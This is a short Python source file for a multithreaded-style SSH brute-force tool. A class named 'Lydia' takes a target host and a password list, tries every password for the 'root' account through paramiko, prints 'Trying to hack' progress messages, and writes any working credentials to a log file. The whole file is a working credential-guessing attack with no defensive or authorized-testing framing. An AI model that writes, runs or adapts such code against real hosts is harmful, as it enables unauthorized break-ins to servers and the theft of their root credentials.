from asyncore import write
from contextlib import suppress
import paramiko
from termcolor import colored

username = "root"

class Lydia:
    def __init__(self, host, threadnr, passlistpath, logfilepath) -> None:
        self.host = host
        self.threadnr = threadnr
        self.logfilepath = logfilepath
        self.passlistpath = passlistpath
    def tryConnect(self, host, n, p):
        client = paramiko.client.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(host, username=n, password=p, banner_timeout=2)
            return True
        except:
            try:
                return False
            except:
                return False
    def hack(self):
        print("[" + colored("Thread " + self.threadnr, "red") + "][" + colored("INFO", "cyan") + "] Trying to hack " + colored(self.host, "magenta") + " now...")
        logfile = open(self.logfilepath, "a", encoding = 'utf-8', errors = 'ignore')
        logfile.write(self.host + ":\n")
        with open(self.passlistpath, 'r', encoding = 'utf-8', errors = 'ignore') as passfile:
            lines = passfile.readlines()
        for line in lines:
            line = line.strip()
            if self.tryConnect(self.host, username, line):
                print("[" + colored("Thread " + self.threadnr, "red") + "][" + colored("SUCCESS", "green") + "] Credentials are username: " + colored(username, "green") + " password: " + colored(line, "green"))
                logfile.write("\t[SUCCESS] Credentials are username: " + username+ " password: " + line + "\n")
                return True
            else:
                print("[" + colored("Thread " + self.threadnr, "red") + "][" + colored("INFO", "cyan") + "] Failed to connect with credentials username: " + colored(username, "red") + " password: " + colored(line, "red"))
                #logfile.write("\t[INFO] Failed to connect with credentials username: " + username + " password: " + line + "\n")

